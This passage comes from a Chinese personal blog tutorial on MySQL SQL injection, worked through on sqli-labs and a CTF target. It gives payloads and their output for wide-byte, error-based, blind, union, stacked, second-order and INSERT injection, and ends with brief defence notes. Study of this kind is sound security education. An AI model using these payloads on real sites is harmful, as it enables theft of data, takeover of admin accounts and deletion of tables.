<p>在字符集是gbk的时候，一个汉字用两个字节表示，首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），刚好涵盖了转义符号\对应的编码0×5C</p>
<p>那么我们在单双引号前面在多加一个“%df”，这个%df会和反斜杠形成一个字，从而单引号逃逸出来<br><img src="https://s2.ax1x.com/2019/04/02/Ayq6D1.png" alt> </p>
<blockquote>
<p>要注意的是get传参和post传参是不一样的，get在传到服务器之前会转码，post不会，如果注入的时候的post的话，我们就要先对%df进行转码再发送数据包</p>
</blockquote>
<h3 id="宽字节注入防御"><a href="#宽字节注入防御" class="headerlink" title="宽字节注入防御"></a>宽字节注入防御</h3><p>防御宽字节注入，除了要进行更严格的过滤之外，还需要一个字符集的设置，这个post,get都适用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql_set_charset(&apos;gbk&apos;,$conn);</span><br></pre></td></tr></table></figure></p>
<p>过滤的一些函数,这两个函数都是将一些特殊的字符给转义了。从而失去原有的意义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string();</span><br><span class="line">addslashes();</span><br></pre></td></tr></table></figure></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p> 报错行注入的前提是在页面上必须得有错误的信息才行，否则为空谈。</p>
<p> 注入时需要用到的关键词：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@@basedir         -&gt; 返回出mysql的路径</span><br><span class="line">@@version         -&gt; 返回mysql的版本</span><br><span class="line">user()            -&gt; 返回当前的用户名</span><br><span class="line">database()        -&gt; 返回当前使用的库名</span><br><span class="line">and               -&gt; &amp;&amp;</span><br><span class="line">or                -&gt; ||</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>floor() 方式<br>–  floor()该函数是向下取整的；</p>
<h4 id="利用方"><a href="#利用方" class="headerlink" title="利用方"></a>利用方</h4><p>主键重复：</p>
</li>
</ul>
<p>其实报错注入就是套用一个万能的公式，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host from user where user = &apos;root&apos; and (select 1 from (select count(*),concat([执行的sql语句]],floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure></p>
<p>以sqli-labs为例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);--+</span><br></pre></td></tr></table></figure>
<p>页面回显<br>发现user()已经在页面中显示出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure></p>
<p>接下来就继续爆库，爆表等等……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=(select database()) limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a);--+</span><br></pre></td></tr></table></figure></p>
<p>结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &apos;referers1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure></p>
<p>之后修改limit后的值就可以一个一个的爆出来表名，<br>==报错注入不能使用group_concat()这个函数==</p>
<ul>
<li>extractvalue()方式：有两个参数<br>EXTRACTVALUE (XML_document, XPath_string);</li>
</ul>
<p>第一个参数：XML_document是String格式，为XML文档对象的<br>名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串).</p>
<p>作用：从目标XML中返回包含所查询值的字符串<br>concat()该函数是将字符串连接起来</p>
<p>利用方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, payload)</span><br><span class="line">and extractvalue(1, concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and extractvalue(1,concat(0x7e,(select user()),0x7e));--+</span><br></pre></td></tr></table></figure>
<p>页面回显：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure>
<p>爆库：==这个可以用group_concat()函数==</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=(select database())),0x7e));--+</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &apos;~emails,referers,uagents,users~&apos;</span><br></pre></td></tr></table></figure>
<ul>
<li>updatexml()方式：有三个参数<br>这个跟extractvalue()有点类似</li>
</ul>
<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and updatexml(1,concat(0x7e,(select user()),0x7e),1);--+</span><br></pre></td></tr></table></figure></p>
<p>页面回显</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &apos;~root@localhost~&apos;</span><br></pre></td></tr></table></figure>
<p>然后一步一步的往下进行</p>
<ul>
<li>geometrycollection() 方式</li>
</ul>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
<p>这种方法在sqli-lab 2中不能行，<br>在BUGKU中报错注入中能行</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/index.php?id=1%0Aand%0Ageometrycollection((select%0a*%0afrom(select%0a*%0afrom(select%0auser())a)b))</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illegal non geometric &apos;(select `b`.`user()` from (select &apos;sql4@localhost&apos; AS `user()` from dual) `b`)&apos; value found during parsing</span><br></pre></td></tr></table></figure>
<ul>
<li>其他的<br>multipoint()<br>polygon()<br>multipolygon()<br>linestring()<br>multilinestring()</li>
</ul>
<p>用法和geometrycollection()基本上一样</p>
<ul>
<li>exp()方式-&gt;这个函数为以e为底的对数函数</li>
</ul>
<p>值类型超出范围导致报错，在MySQL版本大于等于5.5.5的的时候才能用户</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
<h3 id="基于时间的布尔盲注"><a href="#基于时间的布尔盲注" class="headerlink" title="基于时间的布尔盲注"></a>基于时间的布尔盲注</h3><p>当页面没有回显并且没有报错信息，并且存在sql注入漏洞，那么就可以利用基于时间的盲注</p>
<p>就是通过构造payload来执行sleep()函数，若sql语句是正确的，就可以执行sleep(5)</p>
<p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/Practice platform/sqli-labs-master/Less-9/index.php?id=1&apos; and if((ascii(substr((select database()),1,1))=115),sleep(5),0);--+</span><br></pre></td></tr></table></figure></p>
<h3 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h3><p>布尔型注入指的是页面上没有查询的回显，连报错信息都没有，只能通过页面显示正常不正常来判断<br>这里我直接粘贴payload，原理和上一个差不多<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and length(database())&gt;7;--+    对的</span><br><span class="line">id=1&apos; and length(database())&gt;8;--+    错的</span><br><span class="line">id=1&apos; and length(database())=8;--+    对的   说明数据库名字的长度为8</span><br><span class="line"></span><br><span class="line">id=1&apos; and ascii(substr(database(),1,1))&gt;32;--+     对    说明改字符在32-127之间</span><br><span class="line">id=1&apos; and ascii(substr(database(),1,1))&gt;127;--+    错</span><br><span class="line">id=1&apos; and ascii(substr(database(),1,1))=115;--+    成立    说明第一个字符的ascii码值为115  -----s</span><br></pre></td></tr></table></figure></p>
<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>使用联合查询的前提是在页面上必须要有显示位<br>union的使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test_data where id=1 union select 1,2,3;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  1 | radish   | radish_pw |</span><br><span class="line">|  1 | 2        | 3         |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test_data where id=0 union select 1,2,3;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | 2        | 3        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure></p>
<p>可以看出来，第一个条件若查出数据，则会显示两条数据，第二条是union后的select查询的；若第一条不能查询出数据，则只显示第二条是union后的select查询的</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>####官方介绍<br>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束。这样我们就想到了是不是可以多句一起使用。在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<h4 id="说白了就是用分号可以执行多条语句"><a href="#说白了就是用分号可以执行多条语句" class="headerlink" title="说白了就是用分号可以执行多条语句"></a>说白了就是用分号可以执行多条语句</h4><p>eg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin;select 1;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin    | admin    |</span><br><span class="line">| guest    | guest    |</span><br><span class="line">| hacker   | hacker   |</span><br><span class="line">+----------+----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
<p>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。</p>
<p>因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入漏洞字面上理解可能就是结合两个注入漏洞点实现sql注入的目的，但是这其中还有几个细节需要讲解一下。首先，第一个注入点因为经过过滤处理所以无法触发sql注入漏洞，比如addslashes函数，将单引号等字符转义变成\’。但是存进数据库后，数据又被还原了，也就是反斜杠没了，在这种情况下，如果能发现一个新的注入同时引用了被插入了的数据库数据，就可以实现闭合新发现的注入漏洞引发漏洞。<br><img src="https://s2.ax1x.com/2019/04/02/Ayq2E6.jpg" alt> </p>
<p>实例（sql-lab-24）：<br>在这一关中用户可以注册用户，登录之后可以修改本次登录的用户的密码，那么就第二次用到了用户名<br><img src="https://s2.ax1x.com/2019/04/02/AyqTKA.png" alt><br>用户名直接被带到了update语句中，我们可以根据这个update语句来构造我们想要执行的sql语句，比如说修改admin的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册是用户名：admin&apos;--(空格)</span><br><span class="line">密码随意</span><br></pre></td></tr></table></figure></p>
<p>然后登录进去后修改密码时的sql语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;-- &apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure></p>
<p>可以看到成功的注释掉了后面的sql语句，修改的是admin的密码</p>
<h3 id="insert、update等其他语句的注入"><a href="#insert、update等其他语句的注入" class="headerlink" title="insert、update等其他语句的注入"></a>insert、update等其他语句的注入</h3><p>比如说：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into user(username,password) values(&apos;uname&apos;,&apos;passwd&apos;);</span><br></pre></td></tr></table></figure></p>
<p>在碰到这种注入的时候，就不能通过联合查询进行注入，一般情况下用报错注入，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=&apos; and extractvalue(1, concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br><span class="line">uname=123&apos; and extractvalue(1, concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1&amp;passwd=123</span><br></pre></td></tr></table></figure></p>
<p>这个payload既闭合了单引号，又可以执行</p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
